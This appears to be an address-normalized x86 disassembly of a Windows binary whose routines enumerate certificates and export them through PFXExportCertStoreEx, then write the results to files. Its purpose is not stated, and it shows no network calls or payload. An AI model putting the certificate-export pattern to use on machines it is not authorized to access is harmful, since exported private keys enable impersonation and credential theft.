sub_401010
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_437d2d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_401050
push ebp
mov ebp esp
push 0xffffffff
push sub_452690
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x44 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x30 ] cx
push 0x1e
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x10000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x30 ] ax
push 0x2b
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x70000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x3
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
push 0x1f
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x30 ] dx
call sub_401c90
mov [ ebp - 0x14 ] 0x20000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
mov [ ebp - 0x30 ] cx
push 0x2c
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x80000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x5
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ ebp - 0x30 ] ax
push 0x2a
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x90000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
mov ebx 0x7
push 0x21
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x30 ] dx
call sub_401c90
mov [ ebp - 0x14 ] 0x40000
mov [ ebp - 0x4 ] bl
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
call sub_401a00
mov ebx 0x8
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] ebx
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
mov [ ebp - 0x30 ] cx
push 0x17
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x60000
mov [ ebp - 0x4 ] bl
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
call sub_401a00
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ ebp - 0x30 ] ax
push 0x1a
mov eax r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
call sub_401c90
mov [ ebp - 0x14 ] 0x50000
lea ecx [ ebp - 0x30 ]
lea ebx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x9
call sub_401a00
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
mov ebx [ ebp - 0x40 ]
cmp ebx [ ebp - 0x3c ]
je r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_43811c
add esp 0x4
cmp ebx esi
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov esi ebx
cmp ebx [ ebp - 0x3c ]
je r-xdata
mov esi [ ebx + 0x10 ]
mov ecx esi
cmp ecx esi
jae r-xdata
lea eax [ ebp + 0x8 ]
xor al al
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
push ebx
call sub_43811c
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx esi
cmp esi edi
jb r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x20
cmp esi [ ebp - 0x3c ]
jne r-xdata
mov edx [ esi ]
push edx
call sub_43811c
mov ebx [ ebp - 0x40 ]
add esp 0x4
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov edx edi
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
cmp esi edi
jb r-xdata
mov di [ ecx ]
cmp di [ eax ]
jne r-xdata
test edx edx
je r-xdata
add ebx 0x20
cmp ebx [ ebp - 0x3c ]
jne r-xdata
xor eax eax
cmp esi edi
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
mov ebx [ ebp - 0x40 ]
xor esi esi
mov edi [ ebp - 0x40 ]
mov eax [ ebx + 0x1c ]
mov ecx [ ebp - 0x44 ]
mov [ ecx ] eax
test edi edi
je r-xdata
mov edi [ ebp + 0x18 ]
mov edi [ ebp + 0x18 ]
jmp r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov esi edi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x20
cmp esi [ ebp - 0x3c ]
jne r-xdata
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push edi
call sub_43811c
add esp 0x4
sub_401440
push ebp
mov ebp esp
push 0xffffffff
push sub_453948
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
xor ecx ecx
mov [ ebp - 0x2c ] cx
mov ecx eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea esi [ ecx + 0x2 ]
lea esp [ esp ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea ecx [ ebp - 0x2c ]
call sub_401c90
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_401b00
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x14
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
sub_4014f0
push ebp
mov ebp esp
push ebx
push edi
push 0x0
push 0x0
push 0x0
push 0x0
mov ebx eax
push 0x4
push ebx
call [ CertGetNameStringW@IAT ]
mov edi eax
cmp edi 0x1
jbe r-xdata
pop edi
xor al al
pop ebx
pop ebp
retn
xor ecx ecx
mov edx 0x2
mul edx
seto cl
push esi
neg ecx
or ecx eax
push ecx
call sub_435b34
add esp 0x4
push edi
mov esi eax
push esi
push 0x0
push 0x0
push 0x4
push ebx
call [ CertGetNameStringW@IAT ]
cmp eax 0x1
mov eax esi
seta bl
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edx
sar eax 0x1
push eax
mov eax esi
call sub_401c90
push esi
call sub_438111
add esp 0x4
pop esi
pop edi
mov al bl
pop ebx
pop ebp
retn
sub_401580
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ CertGetCertificateContextProperty@IAT ]
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x2
push esi
xor bl bl
mov [ ebp - 0x8 ] 0x0
call edi
test eax eax
je r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
push ecx
call sub_435b34
add esp 0x4
lea edx [ ebp - 0x8 ]
push edx
mov ebx eax
push ebx
push 0x2
push esi
call edi
test eax eax
setne al
mov [ ebp - 0x1 ] al
test al al
je r-xdata
push ebx
call sub_438111
mov al [ ebp - 0x1 ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x6
add ecx 0x1c
mov eax r--data
call sub_401c90
mov esi [ ebp + 0x8 ]
mov ecx eax
lea esi [ ecx + 0x2 ]
push 0x6
mov eax r--data
mov ecx eax
lea edi [ ecx + 0x2 ]
mov edi edi
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
mov esi [ ebp + 0x8 ]
sar ecx 0x1
push ecx
lea ecx [ esi + 0x1c ]
call sub_401c90
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov ecx esi
call sub_401c90
mov eax [ ebx + 0x10 ]
mov [ esi + 0x40 ] eax
mov ecx [ ebx + 0xc ]
mov [ esi + 0x3c ] ecx
mov edx [ ebx + 0x18 ]
mov [ esi + 0x44 ] edx
mov eax [ ebx + 0x8 ]
mov [ esi + 0x38 ] eax
sub_401680
push ebp
mov ebp esp
push 0xffffffff
push sub_451210
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor ebx ebx
push ebx
push 0x2000
push ebx
push ebx
push 0x2
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xd ] bl
call [ CertOpenStore@IAT ]
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push edi
push esi
mov [ ebp - 0x1c ] ebx
call [ CertAddCertificateContextToStore@IAT ]
test eax eax
je r-xdata
push 0x1
push esi
call [ CertCloseStore@IAT ]
mov esi 0x8
cmp [ ebp + 0x1c ] esi
jb r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
jae r-xdata
xor edx edx
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x8 ] dx
cmp [ ebp + 0x38 ] esi
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
mov edi [ PFXExportCertStoreEx@IAT ]
push 0x6
push ebx
push eax
lea ecx [ ebp - 0x18 ]
push ecx
push esi
call edi
test eax eax
je r-xdata
lea eax [ ebp + 0x24 ]
mov al [ ebp - 0xd ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x24 ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x1c ]
push eax
call [ CertFreeCertificateContext@IAT ]
mov edx [ ebp - 0x18 ]
push edx
call sub_435b34
add esp 0x4
cmp [ ebp + 0x38 ] 0x8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x24 ]
jae r-xdata
push 0x6
push ebx
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
call edi
test eax eax
je r-xdata
lea eax [ ebp + 0x24 ]
mov edx [ ebp - 0x14 ]
push edx
call sub_438111
add esp 0x4
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp + 0x8 ]
cmp edi 0xffffffff
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push ebx
lea ecx [ ebp - 0x20 ]
push ecx
push edx
push eax
push edi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x20 ]
jne r-xdata
push edi
call [ FlushFileBuffers@IAT ]
test eax eax
setne [ ebp - 0xd ]
sub_401800
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
xor bl bl
cmp [ ebp + 0x1c ] 0x8
jae r-xdata
push esi
push 0x0
push 0x0
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x8
pop esi
jb r-xdata
cmp esi 0xffffffff
je r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
call sub_43811c
add esp 0x4
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0x4 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edx
push esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
push esi
call [ FlushFileBuffers@IAT ]
test eax eax
setne bl
sub_401890
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp [ ebp + 0x24 ] 0x8
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] 0xb0b5f11e
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
jae r-xdata
push esi
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0x40000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea eax [ ebp + 0x10 ]
cmp [ ebp + 0x24 ] 0x8
pop esi
jb r-xdata
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov al bl
xor ecx ebp
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
call sub_43811c
add esp 0x4
push edi
mov edi [ WriteFile@IAT ]
push ebx
lea ecx [ ebp - 0x20 ]
push ecx
push 0x14
lea edx [ ebp - 0x18 ]
push edx
push esi
call edi
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
cmp [ ebp - 0x20 ] 0x14
jne r-xdata
push ebx
lea eax [ ebp - 0x20 ]
push eax
push 0x4
lea ecx [ ebp + 0xc ]
push ecx
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x24 ]
push ebx
lea edx [ ebp - 0x20 ]
push edx
push eax
push ecx
push esi
call edi
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x20 ]
jne r-xdata
push esi
call [ FlushFileBuffers@IAT ]
test eax eax
setne bl
sub_401980
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
lea edi [ ecx + 0x2 ]
lea esp [ esp ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_401c90
mov eax esi
pop edi
retn
sub_4019c0
push ebp
mov ebp esp
mov ecx eax
push esi
lea esi [ ecx + 0x2 ]
lea esp [ esp ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401c90
pop esi
pop ebp
retn 0x4
sub_401a00
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ ebx + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov ecx [ ebx ]
cmp ecx edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
mov ecx ebx
call sub_401da0
sub edi ecx
sar edi 0x5
mov esi edi
cmp eax [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] dx
call sub_4023e0
mov eax [ edi + 0x1c ]
mov [ esi + 0x1c ] eax
shl esi 0x5
add esi [ ebx ]
mov edi esi
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx ebx
call sub_401da0
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] ax
call sub_4023e0
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
jmp r-xdata
sub_401ad0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push edi
mov edi [ esi + 0x4 ]
call sub_402020
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
pop edi
sub_401b00
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
mov ecx ebx
call sub_401df0
sub edi eax
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] ax
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx ebx
call sub_401df0
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] dx
jmp r-xdata
call sub_4023e0
sub_401be0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x10 ]
cmp esi ebx
jae r-xdata
sub esi ebx
cmp eax esi
jae r-xdata
push r--data
call sub_435ac6
cmp edi ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_401ef0
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_401e70
mov eax ebx
xor ecx ecx
call sub_401e70
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ edi ]
xor edx edx
mov [ ebx + eax ] dx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
lea ebx [ esi + esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_43a8a0
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_401c90
push ebp
mov ebp esp
push esi
mov esi eax
push edi
mov edi ecx
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x7ffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_435a79
mov eax edi
mov eax [ edi ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebx
push edi
call sub_402170
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp esi eax
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop ebx
mov eax edi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
xor edx edx
pop ebx
mov [ eax ] dx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax esi
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ ebx + eax ] cx
mov eax [ edi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add ebx ebx
push ebx
push esi
push eax
call sub_43a8a0
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] eax
jb r-xdata
mov eax edi
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_401be0
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_401be0
pop edi
pop esi
pop ebp
retn 0x4
sub_401da0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x5
cmp eax edx
jbe r-xdata
push r--data
call sub_435a79
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_401f40
mov edx eax
cmp edx eax
jae r-xdata
sub_401df0
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x9249248
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_402060
mov eax esi
cmp eax esi
jae r-xdata
sub_401e70
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_435ac6
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop edi
retn
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_437db0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_401ef0
cmp esi 0x7ffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_435a79
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_402170
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x8
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ eax ]
sub_401f40
push ebp
mov ebp esp
push 0xffffffff
push sub_452620
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x7ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x5
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_4022e0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_402450
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov ebx ecx
add esp 0xc
sub ebx eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl edi 0x5
add edi eax
and ebx 0xffffffe0
add ebx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
mov edi ecx
call sub_402020
mov ecx [ esi ]
push ecx
call sub_43811c
mov edi [ ebp + 0x8 ]
add esp 0x4
sub_402020
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x20
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_402060
